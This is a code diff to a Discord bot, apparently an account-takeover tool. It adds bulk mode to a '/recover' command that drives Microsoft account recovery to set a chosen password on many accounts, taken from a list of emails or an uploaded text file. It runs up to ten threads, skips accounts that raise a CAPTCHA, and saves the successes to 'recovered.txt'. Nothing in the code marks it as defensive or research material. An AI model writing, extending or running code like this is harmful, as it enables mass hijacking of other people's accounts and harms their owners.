@@ -792,75 +792,147 @@ async function handleBotStats(respond, callerId) {
 
 // ── Account Recovery Handler ─────────────────────────────────
 
-async function handleRecover(respond, userId, email, newPassword, interaction, message) {
+async function recoverSingleEmail(email, newPassword, userId) {
+  const result = await initiateRecovery(email);
+  if (!result.success) {
+    return { email, success: false, error: result.error };
+  }
+  if (result.phase === "password_reset") {
+    const pwResult = await submitNewPassword(result, newPassword);
+    statsManager.recordResult(userId, pwResult.success ? "success" : "failed");
+    return { email, success: pwResult.success, message: pwResult.success ? pwResult.message : pwResult.error };
+  }
+  if (result.phase === "captcha_required") {
+    return { email, success: false, error: `CAPTCHA required (${result.captchaInfo.type || "unknown"}) — skipped in bulk mode`, skipped: true, session: result };
+  }
+  if (result.phase === "verify_identity") {
+    return { email, success: false, error: "Identity verification required — skipped", skipped: true };
+  }
+  return { email, success: false, error: `Unexpected phase: ${result.phase}` };
+}
+
+async function handleRecover(respond, userId, emailsRaw, emailsFile, newPassword, threads, dmUser, interaction, message) {
   if (!isOwner(userId) && !auth.isAuthorized(userId)) {
     return respond({ embeds: [errorEmbed("Not authorized. Ask the owner to run `/auth`.")] });
   }
   if (blacklist.isBlacklisted(userId)) {
     return respond({ embeds: [errorEmbed("You are blacklisted.")] });
   }
-  if (!email) {
-    return respond({ embeds: [errorEmbed("Provide an email address to recover.")] });
-  }
   if (!newPassword) {
     return respond({ embeds: [errorEmbed("Provide the new password to set.")] });
   }
 
-  await respond({ embeds: [recoverProgressEmbed(email, "Initiating recovery...")] });
-
-  const result = await initiateRecovery(email);
-
-  if (!result.success) {
-    return respond({ embeds: [recoverResultEmbed(email, false, result.error)] });
+  // Collect emails from input + file
+  let emails = splitInput(emailsRaw).map(e => e.trim().toLowerCase()).filter(e => e.includes("@"));
+  if (emailsFile) {
+    const lines = await fetchAttachmentLines(emailsFile);
+    emails = emails.concat(lines.map(l => l.trim().toLowerCase()).filter(l => l.includes("@")));
   }
 
-  if (result.phase === "password_reset") {
-    // No CAPTCHA needed — submit password directly
-    const pwResult = await submitNewPassword(result, newPassword);
-    statsManager.recordResult(userId, pwResult.success ? "success" : "failed");
-    return respond({ embeds: [recoverResultEmbed(email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
+  if (emails.length === 0) {
+    return respond({ embeds: [errorEmbed("No emails provided. Provide email(s) or attach a `.txt` file.")] });
   }
 
-  if (result.phase === "captcha_required") {
-    // Store session for this user
-    activeRecoverySessions.set(userId, { ...result, newPassword });
+  // Single email — original interactive flow (supports CAPTCHA)
+  if (emails.length === 1) {
+    const email = emails[0];
+    await respond({ embeds: [recoverProgressEmbed(email, "Initiating recovery...")] });
 
-    const captchaType = result.captchaInfo.type || "unknown";
-    let captchaMsg = `CAPTCHA required (type: \`${captchaType}\`).\n\n`;
+    const result = await initiateRecovery(email);
 
-    // Try to download and send HIP image
-    if (result.captchaInfo.type === "hip" && result.captchaInfo.imageUrl) {
-      const imgBuffer = await downloadCaptchaImage(result.captchaInfo.imageUrl, result.cookieJar);
-      if (imgBuffer) {
-        const { AttachmentBuilder } = require("discord.js");
-        const attachment = new AttachmentBuilder(imgBuffer, { name: "captcha.png" });
-        captchaMsg += "Solve the CAPTCHA below and reply with:\n`/captcha <solution>`\nor `.captcha <solution>`";
-        return respond({
-          embeds: [recoverProgressEmbed(email, captchaMsg)],
-          files: [attachment],
-        });
+    if (!result.success) {
+      return respond({ embeds: [recoverResultEmbed(email, false, result.error)] });
+    }
+
+    if (result.phase === "password_reset") {
+      const pwResult = await submitNewPassword(result, newPassword);
+      statsManager.recordResult(userId, pwResult.success ? "success" : "failed");
+      return respond({ embeds: [recoverResultEmbed(email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
+    }
+
+    if (result.phase === "captcha_required") {
+      activeRecoverySessions.set(userId, { ...result, newPassword });
+      const captchaType = result.captchaInfo.type || "unknown";
+      let captchaMsg = `CAPTCHA required (type: \`${captchaType}\`).\n\n`;
+      if (result.captchaInfo.type === "hip" && result.captchaInfo.imageUrl) {
+        const imgBuffer = await downloadCaptchaImage(result.captchaInfo.imageUrl, result.cookieJar);
+        if (imgBuffer) {
+          const { AttachmentBuilder } = require("discord.js");
+          const att = new AttachmentBuilder(imgBuffer, { name: "captcha.png" });
+          captchaMsg += "Solve the CAPTCHA below and reply with:\n`/captcha <solution>`\nor `.captcha <solution>`";
+          return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)], files: [att] });
+        }
       }
+      if (result.captchaInfo.type === "funcaptcha") {
+        captchaMsg += `FunCaptcha site key: \`${result.captchaInfo.siteKey || "N/A"}\`\nPage URL: \`${result.pageUrl}\`\n\n`;
+        captchaMsg += "Solve externally, then: `/captcha <token>`";
+      } else {
+        captchaMsg += "Solve externally, then: `/captcha <solution>`";
+      }
+      return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)] });
     }
 
-    if (result.captchaInfo.type === "funcaptcha") {
-      captchaMsg += `FunCaptcha site key: \`${result.captchaInfo.siteKey || "N/A"}\`\n`;
-      captchaMsg += `Page URL: \`${result.pageUrl}\`\n\n`;
-      captchaMsg += "Solve the FunCaptcha externally, then reply with:\n`/captcha <token>`\nor `.captcha <token>`";
-    } else {
-      captchaMsg += "Solve the CAPTCHA externally, then reply with:\n`/captcha <solution>`\nor `.captcha <solution>`";
+    if (result.phase === "verify_identity") {
+      const options = result.verifyInfo.options.map((o) => `\`${o.index}\`: ${o.label}`).join("\n");
+      return respond({ embeds: [recoverProgressEmbed(email, `Identity verification required.\n\nOptions:\n${options}\n\nNot yet automated.`)] });
     }
 
-    return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)] });
+    return respond({ embeds: [recoverResultEmbed(email, false, `Unexpected phase: ${result.phase}`)] });
   }
 
-  if (result.phase === "verify_identity") {
-    const options = result.verifyInfo.options.map((o) => `\`${o.index}\`: ${o.label}`).join("\n");
-    return respond({
-      embeds: [recoverProgressEmbed(email, `Identity verification required.\n\nOptions:\n${options}\n\nThis flow requires selecting a verification method — not yet automated.`)],
-    });
+  // Bulk mode
+  const concurrency = Math.min(threads || 1, 10);
+  const msg = await respond({ embeds: [recoverProgressEmbed(`${emails.length} emails`, `Starting bulk recovery (${concurrency} threads)...`)] });
+  const editMsg = (opts) => { try { if (msg?.edit) msg.edit(opts); else respond(opts); } catch {} };
+
+  const results = [];
+  let completed = 0;
+
+  // Process in batches
+  for (let i = 0; i < emails.length; i += concurrency) {
+    const batch = emails.slice(i, i + concurrency);
+    const batchResults = await Promise.all(
+      batch.map(email => recoverSingleEmail(email, newPassword, userId))
+    );
+    results.push(...batchResults);
+    completed += batch.length;
+
+    // Update progress
+    const pct = Math.round((completed / emails.length) * 100);
+    const success = results.filter(r => r.success).length;
+    const failed = results.filter(r => !r.success && !r.skipped).length;
+    const skipped = results.filter(r => r.skipped).length;
+    editMsg({ embeds: [recoverProgressEmbed(
+      `${emails.length} emails`,
+      `Progress: ${completed}/${emails.length} (${pct}%)\nSuccess: ${success} | Failed: ${failed} | Skipped (CAPTCHA): ${skipped}`
+    )] });
   }
 
-  return respond({ embeds: [recoverResultEmbed(email, false, `Unexpected page (phase: ${result.phase}). URL: ${result.pageUrl}`)] });
+  // Build final results
+  const success = results.filter(r => r.success);
+  const failed = results.filter(r => !r.success && !r.skipped);
+  const skipped = results.filter(r => r.skipped);
+
+  const files = [];
+  if (success.length > 0)
+    files.push(textAttachment(success.map(r => `${r.email} | ${r.message || "OK"}`), "recovered.txt"));
+  if (failed.length > 0)
+    files.push(textAttachment(failed.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));
+  if (skipped.length > 0)
+    files.push(textAttachment(skipped.map(r => `${r.email} | ${r.error}`), "skipped.txt"));
+
+  const embed = recoverResultEmbed(
+    `${emails.length} emails`,
+    success.length > 0,
+    `Recovered: ${success.length} | Failed: ${failed.length} | Skipped: ${skipped.length}`
+  );
+
+  const finalOpts = { embeds: [embed], files };
+  editMsg(finalOpts);
+
+  if (dmUser) {
+    try { await dmUser.send(finalOpts); } catch {}
+  }
 }
 
 async function handleCaptchaSolve(respond, userId, solution) {
@@ -1030,9 +1102,12 @@ client.on("interactionCreate", async (interaction) => {
 
     else if (commandName === "recover") {
       await interaction.deferReply();
-      const email = interaction.options.getString("email");
+      const emailsRaw = interaction.options.getString("emails");
+      const emailsFile = interaction.options.getAttachment("emails_file");
       const newPassword = interaction.options.getString("new_password");
-      await handleRecover(respond, user.id, email, newPassword, interaction);
+      const threads = interaction.options.getInteger("threads") || 1;
+      const dm = interaction.options.getBoolean("dm") || false;
+      await handleRecover(respond, user.id, emailsRaw, emailsFile, newPassword, threads, dm ? user : null, interaction);
     }
 
     else if (commandName === "captcha") {
@@ -1210,12 +1285,18 @@ client.on("messageCreate", async (message) => {
     }
 
     else if (cmd === "recover") {
-      const newPassword = args.pop();
-      const email = args.join(" ");
-      if (!email || !newPassword) {
-        return respond({ embeds: [infoEmbed("Usage", "`.recover <email> <new_password>`\n\nInitiate account recovery for a Microsoft account.\n\nExample:\n`.recover email@test.com NewPass123`")] });
+      const hasDm = args.some(a => a === "--dm" || a === "—dm" || a === "–dm");
+      const filteredArgs = args.filter(a => a !== "--dm" && a !== "—dm" && a !== "–dm");
+      const newPassword = filteredArgs.pop();
+      const emailsRaw = filteredArgs.join(" ");
+      const attachment = message.attachments.first();
+      if (!emailsRaw && !attachment) {
+        return respond({ embeds: [infoEmbed("Usage", "`.recover <email(s)> <new_password>` [--dm]\nProvide email(s) or attach a `.txt` file with emails (one per line).\nThe last argument is always the new password.\n\nExamples:\n`.recover email@test.com NewPass123`\n`.recover email1@test.com,email2@test.com NewPass123`\nOr attach emails.txt and: `.recover NewPass123`")] });
       }
-      await handleRecover(respond, message.author.id, email, newPassword, null, message);
+      if (!newPassword) {
+        return respond({ embeds: [errorEmbed("Provide the new password as the last argument.")] });
+      }
+      await handleRecover(respond, message.author.id, emailsRaw, attachment, newPassword, 1, hasDm ? message.author : null, null, message);
     }
 
     else if (cmd === "captcha") {
